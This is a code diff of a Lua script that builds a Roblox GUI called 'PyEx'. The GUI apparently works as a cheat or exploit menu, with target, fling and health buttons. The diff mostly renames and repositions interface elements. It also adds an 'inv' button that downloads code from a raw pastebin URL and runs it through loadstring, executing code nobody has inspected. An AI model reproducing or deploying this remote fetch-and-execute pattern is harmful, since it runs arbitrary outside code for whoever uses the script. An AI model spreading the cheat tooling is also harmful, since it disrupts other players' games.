@@ -3,8 +3,7 @@
 
 -- Instances:
 
-local ScreenGui = Instance.new("ScreenGui")
-ScreenGui.Name = "PyEx"
+local PyEx = Instance.new("ScreenGui")
 local Frame = Instance.new("Frame")
 local UICorner = Instance.new("UICorner")
 local UIAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")
@@ -18,23 +17,25 @@ local TargetSpec = Instance.new("TextBox")
 local UICorner_2 = Instance.new("UICorner")
 local fling = Instance.new("ImageButton")
 local health = Instance.new("ImageButton")
+local inv = Instance.new("ImageButton")
 local ImageButton = Instance.new("ImageButton")
 local UIAspectRatioConstraint_2 = Instance.new("UIAspectRatioConstraint")
 local UICorner_3 = Instance.new("UICorner")
-Instance.new("UIDragDetector", Frame)
+Instance.new("DragDetector", Frame)
 
 --Properties:
 
-ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
-ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+PyEx.Name = "PyEx"
+PyEx.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+PyEx.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 
-Frame.Parent = ScreenGui
+Frame.Parent = PyEx
 Frame.Active = true
 Frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
 Frame.BackgroundTransparency = 0.100
 Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
 Frame.BorderSizePixel = 0
-Frame.Position = UDim2.new(-0.776233912, 1145, 0.142292485, 57)
+Frame.Position = UDim2.new(0.311172664, 0, 0.163934425, 0)
 Frame.Size = UDim2.new(0, 641, 0, 271)
 
 UICorner.CornerRadius = UDim.new(0, 10)
@@ -134,7 +135,17 @@ health.Position = UDim2.new(0.239852399, 0, 0.656826496, 0)
 health.Size = UDim2.new(0, 77, 0, 69)
 health.Image = "rbxassetid://18416638478"
 
-ImageButton.Parent = ScreenGui
+inv.Name = "inv"
+inv.Parent = Frame
+inv.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+inv.BackgroundTransparency = 0.900
+inv.BorderColor3 = Color3.fromRGB(0, 0, 0)
+inv.BorderSizePixel = 0
+inv.Position = UDim2.new(0.409594089, 0, 0.372693717, 0)
+inv.Size = UDim2.new(0, 77, 0, 69)
+inv.Image = "rbxassetid://14996669677"
+
+ImageButton.Parent = PyEx
 ImageButton.BackgroundColor3 = Color3.fromRGB(28, 46, 58)
 ImageButton.BackgroundTransparency = 0.300
 ImageButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
@@ -150,7 +161,7 @@ UICorner_3.Parent = ImageButton
 
 -- Scripts:
 
-local function GSLBVEC_fake_script() -- Frame.main 
+local function EEJLG_fake_script() -- Frame.main 
 	local script = Instance.new('LocalScript', Frame)
 
 	local Players = game:GetService("Players")
@@ -517,9 +528,12 @@ local function GSLBVEC_fake_script() -- Frame.main
 		end
 	end)
 	
+	ui.inv.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet("https://pastebin.com/raw/P6DQ5r2K"))()
+	end)
 end
-coroutine.wrap(GSLBVEC_fake_script)()
-local function IHNBAP_fake_script() -- ImageButton.LocalScript 
+coroutine.wrap(EEJLG_fake_script)()
+local function BLEGX_fake_script() -- ImageButton.LocalScript 
 	local script = Instance.new('LocalScript', ImageButton)
 
 	local mainui = script.Parent
@@ -536,4 +550,4 @@ local function IHNBAP_fake_script() -- ImageButton.LocalScript
 		end
 	end)
 end
-coroutine.wrap(IHNBAP_fake_script)()
+coroutine.wrap(BLEGX_fake_script)()
